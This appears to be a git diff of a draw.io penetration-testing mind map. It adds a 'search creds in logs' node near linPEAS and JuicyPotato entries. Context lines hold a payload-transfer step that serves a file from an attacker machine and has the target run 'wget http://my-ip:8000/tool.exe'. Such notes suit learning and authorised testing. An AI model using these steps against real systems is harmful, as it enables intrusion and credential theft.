@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-04-05T15:55:35.303Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="uLpthq_MqD3pyl51UOQS" version="21.1.4" type="github" pages="7">
+<mxfile host="app.diagrams.net" modified="2023-04-05T15:56:34.676Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="MP3a0G_YUR9H2og9hbs8" version="21.1.4" type="github" pages="7">
   <diagram id="OxgtQte6AoLRu1fJhFKF" name="Reconnaissance">
     <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -660,12 +660,15 @@
           <mxGeometry x="540" y="135" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-4" value="linPEAS" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="550" y="270" width="120" height="60" as="geometry" />
+          <mxGeometry x="510" y="590" width="120" height="60" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-6" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="eydW96J8nSPCopO3k54l-5" target="eydW96J8nSPCopO3k54l-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-7" style="rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="eydW96J8nSPCopO3k54l-5" target="eydW96J8nSPCopO3k54l-4" edge="1">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="p3XK7XwHjG5C0I2znAWz-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" edge="1" parent="1" source="eydW96J8nSPCopO3k54l-5" target="p3XK7XwHjG5C0I2znAWz-1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
         <mxCell id="eydW96J8nSPCopO3k54l-5" value="&lt;div&gt;send script on remote machine&lt;/div&gt;&lt;div&gt;mine: python3 -m http.server 8000&lt;br&gt;&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;remote:wget http://my-ip:8000/&lt;br&gt;&lt;/font&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;tool.exe&lt;/font&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
@@ -688,6 +691,12 @@
         </mxCell>
         <mxCell id="83Cq3oNJ2Gnx3IUDA6h3-3" value="&lt;div&gt;All others versions&lt;/div&gt;&lt;div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;JuicyPotato.exe&lt;/font&gt;&lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="1080" y="160" width="120" height="60" as="geometry" />
+        </mxCell>
+        <mxCell id="p3XK7XwHjG5C0I2znAWz-3" style="edgeStyle=orthogonalEdgeStyle;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;" edge="1" parent="1" source="p3XK7XwHjG5C0I2znAWz-1" target="eydW96J8nSPCopO3k54l-2">
+          <mxGeometry relative="1" as="geometry" />
+        </mxCell>
+        <mxCell id="p3XK7XwHjG5C0I2znAWz-1" value="seach creds in logs if SVC" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
+          <mxGeometry x="540" y="260" width="120" height="60" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
